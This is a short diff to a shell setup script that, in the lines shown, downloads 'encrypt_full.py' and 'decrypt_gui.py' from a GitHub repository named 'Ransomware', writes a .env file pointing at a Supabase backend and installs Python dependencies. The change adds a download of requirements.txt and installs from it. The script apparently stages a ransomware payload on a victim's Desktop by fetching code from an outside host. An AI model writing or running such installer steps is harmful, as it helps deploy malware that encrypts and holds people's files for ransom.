@@ -6,6 +6,9 @@ cd ~/Desktop || exit
 wget https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_full.py
 wget https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py
 
+# Download requirements.txt from GitHub
+wget https://raw.githubusercontent.com/Google-design/Ransomware/main/requirements.txt
+
 # Create the .env file
 cat <<EOF > .env
 SUPABASE_URL="https://qlvtkhpjazvwfnqzoqjr.supabase.co"
@@ -19,7 +22,7 @@ python3 -m venv venv
 source venv/bin/activate
 
 # Install dependencies inside the venv
-pip install cryptography-*.whl supabase-*.whl python_dotenv-*.whl
+pip install -r requirements.txt --prefer-binary
 
 # Deactivate just to be safe
 deactivate
